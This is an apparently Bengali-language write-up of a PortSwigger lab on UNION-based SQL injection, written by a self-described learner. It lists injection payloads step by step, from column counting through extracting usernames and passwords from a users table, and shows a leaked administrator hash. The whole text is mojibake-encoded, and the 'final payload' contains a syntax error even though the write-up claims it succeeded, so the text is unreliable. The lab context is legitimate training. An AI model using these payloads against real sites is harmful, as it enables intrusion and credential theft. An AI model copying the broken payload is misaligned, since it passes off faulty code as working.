

ЁЯзк SQL Injection тАУ UNION Attack

PortSwigger Lab 


ЁЯОп Vulnerability Name
SQL Injection (UNIONтАСbased)


ЁЯза UNIONтАСbased SQL Injection ржХрзА?
UNIONтАСbased SQL injection ржмрзНржпржмрж╣рж╛рж░ ржХрж░рзЗ attacker:

ржорзВрж▓ queryтАСрж░ рж╕рж╛ржерзЗ ржирж┐ржЬрзЗрж░ query ржпрзБржХрзНржд ржХрж░рждрзЗ ржкрж╛рж░рзЗ
ржЕржирзНржп table (ржпрзЗржоржи: users table) ржерзЗржХрзЗ data ржЯрзЗржирзЗ ржЖржирждрзЗ ржкрж╛рж░рзЗ
рж╢рж░рзНржд:

ржжрзБржЗржЯрж╛ queryтАСрж░ column рж╕ржВржЦрзНржпрж╛ ржПржХржЗ рж╣рждрзЗ рж╣ржмрзЗ
data type compatible рж╣рждрзЗ рж╣ржмрзЗ

ЁЯФН Initial Observation (ржЖржорж┐ ржХрзАржнрж╛ржмрзЗ рж╢рзБрж░рзБ ржХрж░рж┐)
ржЖржорж┐ product filter URL ржжрзЗржЦрж┐:

https://lab-id.web-security-academy.net/filter?category=Gifts

ржЖржорж┐ рж╕ржирзНржжрзЗрж╣ ржХрж░рж┐:

category parameter SQL queryтАСрждрзЗ ржмрзНржпржмрж╣рж╛рж░ рж╣ржЪрзНржЫрзЗ

ЁЯФО SQL Injection Confirm ржХрж░рж╛
ржкрзНрж░ржержорзЗ ржЖржорж┐ single quote ржжрж┐рзЯрзЗ test ржХрж░рж┐:

category=Gifts'

тЭМ Error message / abnormal response ржЖрж╕рзЗ

тЮбя╕П ржПржЦрж╛ржирзЗржЗ ржмрзБржЭрж┐
SQL injection рж╕ржорзНржнржм


ЁЯФв Column рж╕ржВржЦрзНржпрж╛ ржмрзЗрж░ ржХрж░рж╛
ржЖржорж┐ ORDER BY ржмрзНржпржмрж╣рж╛рж░ ржХрж░рзЗ column рж╕ржВржЦрзНржпрж╛ ржмрзЗрж░ ржХрж░рж┐:

category=Gifts' ORDER BY 1--
category=Gifts' ORDER BY 2--
category=Gifts' ORDER BY 3--

ORDER BY 3-- ржжрж┐рж▓рзЗ error ржЖрж╕рзЗ

тЮбя╕П ржмрзБржЭрж▓рж╛ржо 2ржЯрж┐ column ржЖржЫрзЗ


ЁЯФН UNION Injection Test
ржЖржорж┐ UNION ржжрж┐рзЯрзЗ test ржХрж░рж┐:

category=Gifts' UNION SELECT NULL,NULL--

тЬФя╕П Page load рж╣рзЯ

тЮбя╕П UNION injection ржХрж╛ржЬ ржХрж░ржЫрзЗ


ЁЯФО TextтАСbased Column ржЦрзЛржБржЬрж╛
ржЖржорж┐ ржХрзЛржи columnтАСржП text ржжрзЗржЦрж╛ржирзЛ рж╣рзЯ рж╕рзЗржЯрж╛ ржмрзЗрж░ ржХрж░рж┐:

category=Gifts' UNION SELECT 'name',NULL--

ResponseтАСржП name ржжрзЗржЦрж╛ ржпрж╛рзЯ

тЮбя╕П ржкрзНрж░ржержо column text support ржХрж░рзЗ


ЁЯТе Retrieving Data from Other Tables
ржПржЗ рж▓рзНржпрж╛ржмрзЗрж░ рж▓ржХрзНрж╖рзНржп ржЫрж┐рж▓
ржЕржирзНржп table (users table) ржерзЗржХрзЗ data ржмрзЗрж░ ржХрж░рж╛ред

ржЖржорж┐ users table ржПрж░ data ржмрзЗрж░ ржХрж░рж╛рж░ ржЪрзЗрж╖рзНржЯрж╛ ржХрж░рж┐ред

тЬФя╕П Final Payload:
category=Gifts' UNION SELECT username, password, FROM users--


ЁЯФе Result
ResponseтАСржП ржЖржорж┐ ржжрзЗржЦрждрзЗ ржкрж╛ржЗ:

administrator 5f4dcc3b5aa765d61d8327deb882cf99

тЮбя╕П ржПржЦрж╛ржирзЗ administrator ржПрж░ credential leak рж╣рзЯрзЗ ржЧрзЗржЫрзЗред





тЬНя╕П Written By
JISAN 
Cybersecurity Learner | Junior Penetration Tester.
Bangladesh ЁЯЗзЁЯЗй